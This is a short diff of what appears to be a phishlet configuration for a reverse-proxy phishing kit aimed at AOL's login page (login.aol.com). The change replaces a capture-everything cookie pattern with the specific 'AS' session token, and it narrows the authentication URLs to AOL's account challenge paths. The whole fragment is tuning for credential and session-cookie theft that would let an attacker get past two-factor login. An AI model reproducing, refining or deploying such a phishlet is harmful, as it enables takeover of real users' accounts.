@@ -8,12 +8,12 @@ sub_filters:
 
 auth_tokens:
   - domain: 'login.aol.com'
-    keys: ['.*,regexp']
+    keys: ['AS']
 
 
 auth_urls:
-  - '/'
-  - '/*'  
+  - '/account/challenge/'
+  - '/account/*'  
  
 
 credentials:
